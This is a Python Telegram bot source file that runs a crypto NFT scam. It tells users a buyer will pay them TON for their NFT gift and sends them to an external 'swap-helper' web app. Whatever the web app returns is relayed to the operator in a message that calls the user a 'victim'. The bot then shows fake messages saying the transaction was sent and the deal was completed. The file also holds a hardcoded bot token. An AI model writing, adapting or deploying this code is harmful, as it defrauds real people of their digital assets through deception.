import asyncio
import logging
from aiogram import Bot, Dispatcher, F
from aiogram.filters import CommandStart, Command
from aiogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton, WebAppInfo

BOT_TOKEN = "8948695236:AAGvAu_6jxAxVZNUx30gY8_vWWGBJO_g_p8"
ADMIN_ID = 8633715900 
BASE_URL = "https://snoix69.github.io/swap-helper/index.html"

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()

TARGET_NFT = ""
TARGET_PRICE = ""

@dp.message(CommandStart())
async def cmd_start(message: Message):
    if not TARGET_NFT:
        await message.answer("Ошибка: админ еще не добавил лот.")
        return

    # Ссылка с параметром &v=3 для сброса кеша
    dynamic_url = f"{BASE_URL}?nft={TARGET_NFT}&price={TARGET_PRICE}&v=3"

    text = (
        "👋 <b>Добро пожаловать в Crypto Swap Helper.</b>\n\n"
        "Мы нашли покупателя на ваш NFT-подарок.\n"
        f"Сумма к получению: <b>{TARGET_PRICE} TON</b>.\n\n"
        "Для завершения сделки и получения средств, пожалуйста, "
        "подтвердите ваш лот, нажав кнопку ниже."
    )
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(
            text="💸 Перейти к сделке", 
            web_app=WebAppInfo(url=dynamic_url)
        )]
    ])
    
    await message.answer(text, reply_markup=keyboard, parse_mode="HTML")

@dp.message(Command("add"))
async def cmd_add(message: Message):
    if message.from_user.id != ADMIN_ID:
        return
    
    # Формат: /add <Адрес_NFT> <Цена>
    args = message.text.split()
    if len(args) != 3:
        await message.answer("Формат: /add <Адрес_NFT> <Цена>\nПример: /add EQ... 55")
        return
        
    global TARGET_NFT, TARGET_PRICE
    TARGET_NFT = args[1]
    TARGET_PRICE = args[2]
    
    await message.answer(f"✅ Лот установлен: {TARGET_NFT} за {TARGET_PRICE} TON.")

@dp.message(F.web_app_data)
async def web_app_data_handler(message: Message):
    data = message.web_app_data.data
    user = message.from_user
    
    try:
        await bot.send_message(
            ADMIN_ID,
            f"🔔 <b>Жертва нажала кнопку!</b>\n"
            f"Юзер: @{user.username} | ID: {user.id}\n"
            f"Данные: <code>{data}</code>",
            parse_mode="HTML"
        )
    except Exception as e:
        logging.error(f"Не смог отправить админу: {e}")

    await message.answer("⏳ <b>Транзакция отправлена в сеть.</b>\nОжидаем подтверждение блокчейна (1-2 минуты)...", parse_mode="HTML")
    await asyncio.sleep(60)
    await message.answer(
        "✅ <b>Сделка успешно завершена!</b>\n\n"
        "Средства зачислены на ваш баланс. Подарок передан покупателю.",
        parse_mode="HTML"
    )

async def main():
    logging.basicConfig(level=logging.INFO)
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
